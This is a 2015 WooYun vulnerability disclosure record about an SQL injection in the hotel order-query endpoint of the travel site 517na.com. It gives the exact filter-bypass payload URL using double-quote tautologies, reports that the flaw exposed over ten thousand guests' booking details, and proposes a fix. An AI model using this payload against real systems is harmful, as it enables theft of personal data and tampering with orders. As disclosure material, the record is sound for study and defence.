{"id": 39731, "wybug_id": "wooyun-2015-093368", "wybug_title": "四川我要去哪517旅行网绕过过滤再次SQL注入导致数万酒店开房信息泄露（入住人姓名、手机、酒店地址、入住时间等敏感信息）", "wybug_corp": "517na.com", "wybug_author": "Jim叔叔", "wybug_date": "2015-01-22 17:40", "wybug_open_date": "2015-03-08 17:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向公众公开  简要描述： 审核大大，这个是绕过过滤。。木有重复 详细说明：  注入点存在于：酒店预订中心-》订单查询（http://jd.517na.com）在查询时会调用如下接口：http://jd.517na.com/HotelOrder/OrderQuery?txtOrderKeyId=&txtStartDate=2014-12-21&txtEndDate=2015-01-22&txtGuestName=&ddlOrderFlag=1&ddlOrderStatus=0&txtBuyerStatffId=针对上一次这一次过滤了更多的参数：输入上一次的payload已经不行了，把括号转义了，检测了or(这样的关键字，单引号也被转义了。\n\n尝试了一会终于试出双引号可以绕过过滤继续注入。。。最终注入Payload：ddlOrderStatus=0 or\"\"=\"\"or\"\"=\"\"http://jd.517na.com/HotelOrder/OrderQuery?txtOrderKeyId=&txtStartDate=2013-10-01&txtEndDate=2015-01-22&txtGuestName=&ddlOrderFlag=1&ddlOrderStatus=0 or\"\"=\"\"or\"\"=\"\"&txtBuyerStatffId=从2013-10-01到2015-01-22国内酒店订单有1万多条：\n\n可以执行支付、查看详情、取消订单等操作！！！\n\n   漏洞证明：  http://jd.517na.com/HotelOrder/OrderQuery?txtOrderKeyId=&txtStartDate=2013-10-01&txtEndDate=2015-01-22&txtGuestName=&ddlOrderFlag=1&ddlOrderStatus=0 or\"\"=\"\"or\"\"=\"\"&txtBuyerStatffId=\n\n\n\n   修复方案：  try{\t//…...        int n=Convert.ToInt32(Request.QueryString[\"ddlOrderStatus\"]);        //......    }catch(Exception ex){            Response.Write(\"送一个返程的机票可好。。。\");}   版权声明：转载请注明来源 Jim叔叔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-01-22 19:12 厂商回复： 感谢jim对517的关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-23 09:17 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  jim叔对旅游网情有独钟    \n     2015-02-21 20:42 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  jim叔对旅游网情有独钟    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}